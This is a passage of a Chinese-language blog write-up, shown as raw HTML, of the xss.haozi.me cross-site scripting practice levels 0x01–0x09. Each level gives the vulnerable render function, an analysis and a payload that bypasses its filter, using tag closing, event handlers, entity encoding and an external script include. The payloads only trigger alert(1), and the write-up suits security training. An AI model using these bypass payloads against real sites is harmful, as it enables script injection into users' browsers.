class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> <span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">'&lt;textarea&gt;'</span> + <span class=\"built_in\">input</span> + <span class=\"string\">'&lt;/textarea&gt;'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在<span class=\"tag\">&lt;<span class=\"name\">textarea</span>&gt;</span>中,没有过滤,构造闭合</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-1\"><a href=\"#input-code-1\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;/<span class=\"name\">textarea</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'1'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-1\"><a href=\"#html-1\" class=\"headerlink\" title=\"html:\"></a>html:</h2> <figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">textarea</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">textarea</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'1'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/001.png\" alt=\"001\"></p>\n<h1 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h1><h2 id=\"server-code-2\"><a href=\"#server-code-2\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (input) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"type\">'&lt;input</span> <span class=\"keyword\">type</span>=<span class=\"string\">\"name\"</span> value=<span class=\"string\">\"' + input + '\"</span>&gt;'</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在<span class=\"tag\">&lt;<span class=\"name\">input</span>&gt;</span>中,没有过滤,双引号闭合,构造双引号闭合</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-2\"><a href=\"#input-code-2\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. \"&gt;<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'1'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-2\"><a href=\"#html-2\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"name\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'1'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>\"&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/002.png\" alt=\"002\"></p>\n<h1 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h1><h2 id=\"server-code-3\"><a href=\"#server-code-3\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> <span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">  const stripBracketsRe = /[()]/g</span><br><span class=\"line\">  <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(stripBracketsRe, <span class=\"string\">''</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">input</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了<span class=\"comment\">()</span>,想办法用其他方式代替<span class=\"comment\">()</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-3\"><a href=\"#input-code-3\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert<span class=\"string\">`1`</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">2. </span><br><span class=\"line\">    利用html的字符实体和SVG。</span><br><span class=\"line\">    SVG意为可缩放矢量图形（Scalable Vector Graphics）。</span><br><span class=\"line\">    SVG 使用 XML 格式定义图像。</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert&amp;#x28;1&amp;#x29;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"> 3. 利用外联</span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">https://xss.haozi.me/j.js</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"> 4. 利用img标签,结合onerrors事件,src资源不存在会触发错误。 </span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\"alert&amp;#x28;&amp;#x31;&amp;#x29;\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-3\"><a href=\"#html-3\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert<span class=\"string\">`1`</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">2. <span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert&amp;#x28;1&amp;#x29;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\">3. <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">https://xss.haozi.me/j.js</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">4. <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\"alert&amp;#x28;&amp;#x31;&amp;#x29;\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/003.png\" alt=\"003\"></p>\n<h1 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h1><h2 id=\"server-code-4\"><a href=\"#server-code-4\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> <span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">  const stripBracketsRe = /[()`]/g</span><br><span class=\"line\">  <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(stripBracketsRe, <span class=\"string\">''</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">input</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-4\"><a href=\"#分析-4\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">多过滤了`</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-4\"><a href=\"#input-code-4\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. </span><br><span class=\"line\">    利用html的字符实体和SVG。</span><br><span class=\"line\">    SVG意为可缩放矢量图形（Scalable Vector Graphics）。</span><br><span class=\"line\">    SVG 使用 XML 格式定义图像。</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert&amp;#x28;1&amp;#x29;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"> 2. 利用外联</span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">https://xss.haozi.me/j.js</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"> 3. 利用img标签,结合onerrors事件,src资源不存在会触发错误。 </span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\"alert&amp;#x28;&amp;#x31;&amp;#x29;\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-4\"><a href=\"#html-4\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert&amp;#x28;1&amp;#x29;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\">2. <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">https://xss.haozi.me/j.js</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">3. <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\"alert&amp;#x28;&amp;#x31;&amp;#x29;\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/004.png\" alt=\"004\"></p>\n<h1 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h1><h2 id=\"server-code-5\"><a href=\"#server-code-5\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function render (input) &#123;</span><br><span class=\"line\">  input = input.replace(/--&gt;/g, '😂')</span><br><span class=\"line\">  return '<span class=\"comment\">&lt;!-- ' + input + ' --&gt;</span>'</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-5\"><a href=\"#分析-5\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">构造闭合</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-5\"><a href=\"#input-code-5\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. --!&gt;<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert(1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-5\"><a href=\"#html-5\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"comment\">&lt;!-- --!&gt;&lt;script&gt;alert(1)&lt;/script&gt; --&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/005.png\" alt=\"005\"></p>\n<h1 id=\"0x06\"><a href=\"#0x06\" class=\"headerlink\" title=\"0x06\"></a>0x06</h1><h2 id=\"server-code-6\"><a href=\"#server-code-6\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> <span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(/auto|on.*=|&gt;/ig, <span class=\"string\">'_'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> `&lt;<span class=\"built_in\">input</span> value=<span class=\"number\">1</span> $&#123;<span class=\"built_in\">input</span>&#125; <span class=\"built_in\">type</span>=<span class=\"string\">\"text\"</span>&gt;`</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-6\"><a href=\"#分析-6\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤&gt;和以auto开头或者<span class=\"keyword\">on</span>开头，=等号结尾的标签属性并替换成<span class=\"title\">_</span>，且忽略大小写；</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1.</span> 可以先定义type=<span class=\"string\">'image'</span>,等价于img标签的方法了。 然后利用换行使=与onerror隔开</span><br><span class=\"line\"><span class=\"number\">2.</span> 用<span class=\"keyword\">on</span>开头的触发事件</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-6\"><a href=\"#input-code-6\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight excel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>. </span><br><span class=\"line\"><span class=\"built_in\">type</span>='image' src='' onerror</span><br><span class=\"line\">=alert(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2</span>.onmouseover</span><br><span class=\"line\">=alert(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-6\"><a href=\"#html-6\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight excel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>. &lt;input <span class=\"built_in\">value</span>=<span class=\"number\">1</span> <span class=\"built_in\">type</span>='image' src='' onerror</span><br><span class=\"line\">=alert(<span class=\"number\">1</span>) <span class=\"built_in\">type</span>=<span class=\"string\">\"text\"</span>&gt;</span><br><span class=\"line\"><span class=\"number\">2</span>.&lt;input <span class=\"built_in\">value</span>=<span class=\"number\">1</span> onmouseover</span><br><span class=\"line\">=alert(<span class=\"number\">1</span>) <span class=\"built_in\">type</span>=<span class=\"string\">\"text\"</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/006.png\" alt=\"006\"></p>\n<h1 id=\"0x07\"><a href=\"#0x07\" class=\"headerlink\" title=\"0x07\"></a>0x07</h1><h2 id=\"server-code-7\"><a href=\"#server-code-7\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> stripTagsRe = <span class=\"regexp\">/&lt;\\/?[^&gt;]+&gt;/gi</span></span><br><span class=\"line\"></span><br><span class=\"line\">  input = input.replace(stripTagsRe, <span class=\"string\">''</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">`&lt;article&gt;<span class=\"subst\">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-7\"><a href=\"#分析-7\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了<span class=\"tag\">&lt;&gt;</span>包含的所有内容并替换成空,利用浏览器兼容性绕过</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-7\"><a href=\"#input-code-7\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>. </span><br><span class=\"line\">&lt;<span class=\"selector-tag\">img</span> src=<span class=\"string\">''</span> onerror=alert`<span class=\"number\">1</span>`</span><br><span class=\"line\">     <span class=\"comment\">//这里有个换行</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-7\"><a href=\"#html-7\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight excel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>. &lt;input <span class=\"built_in\">value</span>=<span class=\"number\">1</span> <span class=\"built_in\">type</span>='image' src='' onerror</span><br><span class=\"line\">=alert(<span class=\"number\">1</span>) <span class=\"built_in\">type</span>=<span class=\"string\">\"text\"</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/007.png\" alt=\"007\"></p>\n<h1 id=\"0x08\"><a href=\"#0x08\" class=\"headerlink\" title=\"0x08\"></a>0x08</h1><h2 id=\"server-code-8\"><a href=\"#server-code-8\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">src</span>) </span>&#123;</span><br><span class=\"line\">  src = src.replace(<span class=\"regexp\">/&lt;\\/style&gt;/ig</span>, <span class=\"string\">'/* \\u574F\\u4EBA */'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">    &lt;style&gt;</span></span><br><span class=\"line\"><span class=\"string\">      <span class=\"subst\">$&#123;src&#125;</span></span></span><br><span class=\"line\"><span class=\"string\">    &lt;/style&gt;</span></span><br><span class=\"line\"><span class=\"string\">  `</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-8\"><a href=\"#分析-8\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了<span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>的大小写。如果输入了<span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>会被替换成/* 坏人 */。通过换行绕过<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"undefined\">即可。</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-8\"><a href=\"#input-code-8\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">style</span></span></span><br><span class=\"line\"><span class=\"tag\">       &gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert</span>`<span class=\"attr\">1</span>`&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-8\"><a href=\"#html-8\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">      &lt;/style</span></span><br><span class=\"line\"><span class=\"xml\">       &gt;<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert</span>`<span class=\"attr\">1</span>`&gt;</span></span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/008.png\" alt=\"008\"></p>\n<h1 id=\"0x09\"><a href=\"#0x09\" class=\"headerlink\" title=\"0x09\"></a>0x09</h1><h2 id=\"server-code-9\"><a href=\"#server-code-9\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> domainRe = <span class=\"regexp\">/^https?:\\/\\/www\\.segmentfault\\.com/</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (domainRe.test(input)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">`&lt;script src=\"<span class=\"subst\">$&#123;input&#125;</span>\"&gt;&lt;/script&gt;`</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">'Invalid URL'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-9\"><a href=\"#分析-9\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">用正则表达式匹配<span class=\"symbol\">'https</span>(http):<span class=\"comment\">//www.segmentfault.com',构造闭合即可。</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-9\"><a href=\"#input-code-9\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. </span><br><span class=\"line\">https://www.segmentfault.com\"&gt;<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert(1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-9\"><a href=\"#html-9\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://www.segmentfault.com\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert(1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>\"&gt;<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/009.png\" alt=\"009\"></p>\n<h1 id=\"0x0A\"><a href=\"#0x0A\" class=\"headerlink\" title=\"0x0A\"></a>0x0A</h1><h2 id=\"server-code-10\"><a href=\"#server-code-10\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span 